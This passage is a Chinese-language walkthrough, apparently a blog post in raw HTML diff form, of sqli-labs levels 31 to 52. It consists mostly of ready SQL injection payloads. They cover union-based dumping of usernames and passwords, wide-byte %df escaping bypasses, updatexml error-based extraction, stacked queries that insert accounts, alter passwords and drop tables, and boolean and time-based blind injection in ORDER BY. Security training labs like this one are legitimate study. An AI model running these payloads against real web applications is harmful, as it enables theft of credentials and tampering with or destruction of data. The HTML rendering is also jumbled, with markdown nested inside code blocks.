class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br>  ?id=<span class="hljs-number">-1</span>&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+<br>  ?id=-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><ul>
+<li><pre><code class="hljs">id=1&quot;) order by 3--+（使用双引号测试）（闭合括号）
+?id=-1&quot;) union select 1,2,3--+
+?id=-1&quot;) union select 1,database(),version()--+
+?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
+?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+
+?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 32（转义 宽字节注入）</span><br><br><span class="hljs-bullet">-</span> ![<span class="hljs-string">image-20250306212036698</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201242247.png</span>)<br><br>  （preg<span class="hljs-emphasis">_replace预定义字符之前添加反斜杠）</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  此函数将   “  ’  转化 </span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  加%df+单引号 ，相当于两个字符---&gt;<span class="hljs-strong">**表示汉字**</span></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  使得<span class="hljs-strong">**单引号**</span>逃逸出来</span><br><span class="hljs-emphasis"></span><br></code></pre></td></tr></table></figure>
+
+?id=-1%df&#39;union select 1,database(),3 --+
+ 
+?id=-1%df&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+     爆表
+ 
+?id=-1%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+   爆字段
+使用16进制
+?id=-1%df&#39; union select 1,group_concat(password,username),3 from users--+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 33</span><br><br>双引号闭合<br><br>- ```<br>  ?<span class="hljs-attribute">id</span>=-1%df&quot;union select 1,database(),3 --+<br>   <br>  ?<span class="hljs-attribute">id</span>=-1%df&quot; union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+     爆表<br>   <br>  ?<span class="hljs-attribute">id</span>=-1%df&quot; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=0x7573657273--+   爆字段<br>  使用16进制<br>  ?<span class="hljs-attribute">id</span>=-1%df&quot; union select 1,group_concat(password,username),3 <span class="hljs-keyword">from</span> users--+<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="34（post-宽字节）"><a href="#34（post-宽字节）" class="headerlink" title="34（post+宽字节）"></a>34（post+宽字节）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201244881.png" srcset="/img/loading.gif" lazyload alt="image-20250306213953154"></p>
+<p>表单类型的宽字节</p>
+<p>报错注入</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>%df&#x27;<br><br><span class="hljs-attribute">1</span>%df&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(SELECT database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) --+<br><br><br><span class="hljs-attribute">1</span>%df&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) --+ <br><br><span class="hljs-attribute">1</span>%df&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) --+<br><br><span class="hljs-attribute">1</span>%df&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>%df&#x27;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><ul>
+<li><p>数字型+函数addslashes()</p>
+<p>（<code>addslashes()</code> 是 PHP 中的一个函数，作用是 <strong>在字符串中特殊字符前添加反斜杠（\）进行转义</strong>，以防止 SQL 注入或字符串解析错误。）</p>
+<p><strong>由于是数字型所以无需要宽字节注入</strong></p>
+<p>直接报错注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span> <br><br>?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br><br>?id=<span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span>  group_concat(<span class="hljs-built_in">table_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+ </span><br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(username,id,<span class="hljs-keyword">password</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> users ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><ul>
+<li><p>单引号+宽字节+mysql_real_escape_string()函数转义</p>
+</li>
+<li><p><code>mysql_real_escape_string()</code> 是 <strong>PHP</strong> 中的一个函数，主要用于<strong>对字符串中的特殊字符进行转义</strong>，以防止 <strong>SQL 注入</strong></p>
+</li>
+<li><p>使用报错注入即可</p>
+</li>
+<li><pre><code class="hljs">1%df&#39;
+
+1%df&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+
+
+
+1%df&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ 
+
+1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+
+
+1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#39;
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>  <br><br>## <span class="hljs-number">37</span><br><br>- 单引号+post+宽字节+MySQL_real_escape_string<br><br>- 同<span class="hljs-number">34</span><br><br>- ```<br>  <span class="hljs-number">1</span>%df<span class="hljs-string">&#x27;</span><br><span class="hljs-string">  </span><br><span class="hljs-string">  1%df&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>  <br>  <br>  <span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27;),0x7e),1) --+ </span><br><span class="hljs-string">  </span><br><span class="hljs-string">  1%df&#x27;</span><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>  <br>  <span class="hljs-number">1</span>%df<span class="hljs-string">&#x27;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#x27;</span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="38（堆叠注入）"><a href="#38（堆叠注入）" class="headerlink" title="38（堆叠注入）"></a>38（堆叠注入）</h2><p>堆叠&#x2F;报错&#x2F;联合</p>
+<ul>
+<li><p>单引号+<strong>mysqli_multi_query函数</strong></p>
+<p><code>mysqli_multi_query函数</code>支持多条sql语句输出</p>
+</li>
+<li><pre><code class="hljs">?id=1&#39;;insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+
+#id=18的数据修改
+改为账户：bx     密码为2328
+
+？id=18
+可查看到18的账户密码已被我们所修改
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+?id=1&#39;;insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+
+注册用户
+?id=1&#39;;create table xxx like users;--+
+创建xxx表
+?id=1&#39;;INSERT INTO xxx SELECT * FROM users;--+
+插入xxx数据
+?id=1&#39;;DELETE FROM xxx;--+
+删除xxx数据
+?id=1&#39;;DROP TABLE xxx;--+
+删除xxx表
+?id=1&#39;;updata users set password=&#39;12345&#39;where username=&#39;xxx&#39;
+修改xxx账户的密码
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>  <br><br><span class="hljs-comment">## 39</span><br><br>堆叠/报错/联合<br><br>- 数字型+**mysqli_multi_query函数**<br><br>  同上<br><br>- ```<br>  ?<span class="hljs-attribute">id</span>=1;insert into users(id,username,password) values(<span class="hljs-string">&#x27;18&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  #<span class="hljs-attribute">id</span>=18的数据修改<br>  改为账户：bx     密码为2328<br>  <br>  ？<span class="hljs-attribute">id</span>=18<br>  可查看到18的账户密码已被我们所修改<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p>堆叠&#x2F;联合</p>
+<ul>
+<li><p>无报错+单引号+括号</p>
+</li>
+<li><pre><code class="hljs">?id=1&#39;);insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+
+#id=18的数据修改
+改为账户：bx     密码为2328
+
+？id=18
+可查看到18的账户密码已被我们所修改
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>  <br><br><span class="hljs-comment">## 41</span><br><br>堆叠/联合<br><br>- 无报错+数字<br><br>- ```<br>  ?<span class="hljs-attribute">id</span>=1&#x27;);insert into users(id,username,password) values(<span class="hljs-string">&#x27;18&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  #<span class="hljs-attribute">id</span>=18的数据修改<br>  改为账户：bx     密码为2328<br>  <br>  ？<span class="hljs-attribute">id</span>=18<br>  可查看到18的账户密码已被我们所修改<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="42-先堆叠，再二次注入"><a href="#42-先堆叠，再二次注入" class="headerlink" title="42(先堆叠，再二次注入)"></a>42(先堆叠，再二次注入)</h2><ul>
+<li><p>账户进行转义，密码没有，但是存在堆叠注入的函数</p>
+<p>（不是gbk编码所以<strong>不能使用</strong>宽字节）</p>
+<p>使用堆叠注入</p>
+<p>单引号</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">login_user</span>=1&amp;login_password=1&#x27;;insert into users(id,username,password) values (<span class="hljs-string">&#x27;39&#x27;</span>,<span class="hljs-string">&#x27;less30&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>)--+&amp;<span class="hljs-attribute">mysubmit</span>=Login<br>将<span class="hljs-attribute">id</span>=39<br>账号：less30<br>密码：123456<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201252794.png" srcset="/img/loading.gif" lazyload alt="image-20250307152806286"></p>
+<p>为单引号+括号</p>
+</li>
+<li><pre><code class="hljs">login_user=1&amp;login_password=1&#39;);insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--+&amp;mysubmit=Login
+将id=39
+账号：less30
+密码：123456
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  <br><br><span class="hljs-section">## 44</span><br><br><span class="hljs-bullet">-</span> 无报错<br><br><span class="hljs-bullet">-</span> 测试<br><br></code></pre></td></tr></table></figure>
+单引号测试成功
+login_user=1&amp;login_password=1&#39;;insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--
+
+将id=39
+账号：less30
+密码：123456
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 45</span><br><br><span class="hljs-bullet">-</span> 无报错<br><br><span class="hljs-bullet">-</span> 测试<br><br>  单引号测试不成功<br><br></code></pre></td></tr></table></figure>
+单引号+括号 测试成功
+login_user=1&amp;login_password=1&#39;);insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--
+
+将id=39
+账号：less30
+密码：123456
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 46</span><br><br><span class="hljs-bullet">-</span> ![<span class="hljs-string">image-20250307153359198</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201255223.png</span>)<br><br>  根据提示输入<span class="hljs-strong">**？sort=1**</span><br><br><span class="hljs-bullet">-</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201257029.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image-20250307153423526&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;zoom: 25%;&quot;</span> /&gt;</span></span><br><br><span class="hljs-bullet">-</span> 出现表格<br><br><span class="hljs-bullet">-</span> 寻找闭合<br><br>  <span class="hljs-strong">**数字型**</span><br><br><span class="hljs-bullet">-</span> 报错注入<br><br></code></pre></td></tr></table></figure>
+?sort=1 and (updatexml(1,concat(0x7c,(select group_concat(password,id,username) from users),0x7c),1))
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>  <br><br>## <span class="hljs-number">47</span><br><br>- 同上<br><br>  闭合为单引号<br><br></code></pre></td></tr></table></figure>
+?sort=1&#39; and (updatexml(1,concat(0x7c,(select group_concat(password,id,username) from users),0x7c),1))
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">## 48（order by 下的布尔/时间）</span><br><br><span class="hljs-bullet">-</span> 无报错<br><br><span class="hljs-bullet">-</span> 布尔/时间<br><br>  布尔<br><br></code></pre></td></tr></table></figure>
+?sort=rand((ascii(mid((select database()),1,1)))&gt;65)
+
+sord=rand and length(database())&gt;7#（猜数据库长度）
+sord=rand and ascii(substr(database(),1,1))&gt;114#（猜数据库名字）
+sord=rand and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5#（猜表名长度）
+sord=rand and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#（猜表名名字）
+sord=rand and (length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1)))&gt;1#（猜列名长度）
+sord=rand and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#（猜列名名字）
+sord=rand and length((select password from users limit 0,1))&gt;3#（猜数据长度）
+sord=rand and ascii(substr((select password from users limit 0,1),1,1))&gt;67#（猜数据名字）
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>时间：<br><br></code></pre></td></tr></table></figure>
+?sort=1&#39;and if(length((select database()))&gt;9,sleep(5),1)--+
+判断数据库名长度
+ 
+?sort=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+逐一判断数据库字符
+?sort=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+
+判断所有表名长度
+ 
+?sort=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+
+逐一判断表名
+?sort=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+
+判断所有字段名的长度
+
+?sort=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+
+逐一判断字段名。
+?sort=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+
+判断字段内容长度
+ 
+?sort=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+
+逐一检测内容。
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 49</span><br><br>- 单引号闭合，无报错，同理，，时间盲注,布尔盲注<br><br>  **布尔盲注在order by**<br><br>  **?<span class="hljs-attribute">sort</span>=<span class="hljs-string">&#x27;| rand(1=2)--+**</span><br><span class="hljs-string"></span><br><span class="hljs-string">  使用时间盲注</span><br><span class="hljs-string"></span><br><span class="hljs-string">- ```</span><br><span class="hljs-string">  ?sort=1&#x27;</span>and <span class="hljs-keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+<br>  判断数据库名长度<br>   <br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+<br>  逐一判断数据库字符<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+<br>  判断所有表名长度<br>   <br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+<br>  逐一判断表名<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(length((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+<br>  判断所有字段名的长度<br>  <br>  ?<span class="hljs-attribute">sort</span>=1&#x27;and <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+<br>  逐一判断字段名。<br>  ?<span class="hljs-attribute">sort</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length((select group_concat(username,password) <span class="hljs-keyword">from</span> users))&gt;109,sleep(5),1)--+<br>  判断字段内容长度<br>   <br>  ?<span class="hljs-attribute">sort</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="hljs-keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+<br>  逐一检测内容。<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="50-堆叠排序注入"><a href="#50-堆叠排序注入" class="headerlink" title="50(堆叠排序注入)"></a>50(堆叠排序注入)</h2><p>堆叠&#x2F;报错&#x2F;盲注</p>
+<ul>
+<li><p>有报错+数字类型</p>
+</li>
+<li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p>
+</li>
+<li><pre><code class="hljs">?sort=1;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+
+知道了账户和密码
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 51</span><br><br>堆叠/报错/盲注<br><br>- 有报错+单引号类型<br><br>- 存在 <span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))---&gt;堆叠注入<br><br>- ```<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;;insert into users(id,username,password) values(<span class="hljs-string">&#x27;41&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  知道了账户和密码<br>  <br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h2 id="52"><a href="#52" class="headerlink" title="52"></a>52</h2><p>堆叠&#x2F;盲注</p>
+<p>无报错+数字型</p>
+<ul>
+<li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p>
+</li>
